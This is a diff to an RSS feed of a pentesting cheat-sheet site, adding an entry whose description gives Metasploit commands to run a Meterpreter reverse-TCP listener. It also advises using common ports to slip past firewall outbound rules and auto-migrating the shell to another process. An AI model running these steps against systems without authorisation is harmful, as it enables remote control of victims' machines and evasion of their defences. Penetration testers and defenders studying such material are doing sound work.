@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@shellcode/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Metasploit Listener</title>
+      <link>https://tldrbins.github.io/metasploit_listener/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
+      <description>Start a Metasploit Listener msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; run Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules&#xA;If the shell die immediately, we can try to migrate it to another process # Create a automigrate.rc script run post/windows/manage/migrate msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; set AutoRunScript multi_console_command -r automigrate.</description>
+    </item>
+    <item>
       <title>Metasploit Shellcode</title>
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
